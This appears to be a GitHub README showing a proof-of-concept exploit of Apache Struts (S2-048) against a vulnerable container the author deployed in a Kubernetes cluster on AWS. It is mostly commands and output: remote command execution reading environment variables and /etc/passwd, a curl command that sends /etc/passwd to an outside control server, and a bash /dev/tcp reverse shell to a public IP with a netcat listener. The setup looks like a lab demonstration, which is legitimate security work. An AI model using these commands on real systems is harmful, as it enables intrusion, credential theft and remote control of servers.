# struts_poc  
![image](https://user-images.githubusercontent.com/4404271/153259381-52907b2b-ab78-4699-bde6-0cf7b35393a8.png)

## There are sometimes holes.
## This is nothing more than good old Kali struts poc rev shell in a k8s cluster. Simple.  
## Scroll down for a tldr GIF :-)  
  

git clone https://github.com/hook-s3c/apache-struts2-PoC  
cd apache-struts2-PoC/  
docker build -t struts .  
docker run -it --rm -d -p 8080:8080 struts:latest  
docker tag struts:latest public.ecr.aws/v9f6i2g3/stuff:latest  
#public login to us-west-2 not supported by aws  
aws ecr-public get-login-password --region us-east-1 | docker login --username AWS --password-stdin public.ecr.aws  
docker push public.ecr.aws/v9f6i2g3/stuff:latest  
kubectl apply -f strust-deploy-and-service.yaml  
ubuntu@brett-jumpbox:myhomedir/apache-struts2-PoC  
  

kubectl get service -n struts  
NAME     TYPE           CLUSTER-IP       EXTERNAL-IP                                                              PORT(S)          AGE  
`struts   LoadBalancer   10.100.144.108   a3dc6544a26b64b7cbe1610fd1714538-870897122.us-west-2.elb.amazonaws.com   8080:30524/TCP   153m` 
  

ubuntu@brett-jumpbox:myhomedir/apache-struts2-PoC python exploitS2-048-cmd.py a3dc6544a26b64b7cbe1610fd1714538-870897122.us-west-2.elb.amazonaws.com:8080 'env'  
KUBERNETES_SERVICE_PORT_HTTPS=443  
KUBERNETES_SERVICE_PORT=443  
STRUTS_PORT_8080_TCP_PORT=8080  
STRUTS_SERVICE_PORT=8080  
HOSTNAME=struts-7d8c95bbbd-9p9pp  
JAVA_HOME=/usr/local/openjdk-8  
GPG_KEYS=05AB33110949707C93A279E3D3EFE6B686867BA6 07E48665A34DCAFAE522E5E6266191C37C037D42 47309207D818FFD8DCD3F83F1931D684307A10A5  
etc..  
  
     
ubuntu@brett-jumpbox:~/apache-struts2-PoC$  
curl 127.0.0.1:8080/showcase.action -v  
#python3 -m venv .  
python exploitS2-048-cmd.py 127.0.0.1:8080 'cat /etc/passwd'  

#from your cc server do python3 webserver.py

`python exploitS2-048-cmd.py a31daafb811f24dc6b521914a12433e6-1984373561.us-west-2.elb.amazonaws.com:8080 'curl jumpbox.brett1.com:8080\hi_from_inside_the_container_in_our_cluster`  

`python exploitS2-048-cmd.py a31daafb811f24dc6b521914a12433e6-1984373561.us-west-2.elb.amazonaws.com:8080 'curl -d @/etc/passwd jumpbox.brett1.com:8080`  

#on your cc server do nc -l 4242  
`python exploitS2-048-cmd.py a3dc6544a26b64b7cbe1610fd1714538-870897122.us-west-2.elb.amazonaws.com:8080 'bash -i >& /dev/tcp/52.206.9.54/4242 0>&1'`

![struts_rs](https://user-images.githubusercontent.com/4404271/153033823-b0d10a6b-4faa-4f0e-b8d1-8dde69cf1562.gif)

![image](https://user-images.githubusercontent.com/4404271/153435925-60ccd750-ad11-4f80-ad72-e27f01d75e09.png)

![image](https://user-images.githubusercontent.com/4404271/153497163-7b424dc2-3652-4798-9200-1606fd54876f.png)

![image](https://user-images.githubusercontent.com/4404271/153490296-a07fb685-8b04-48bb-8af0-7bff11cc2c21.png)

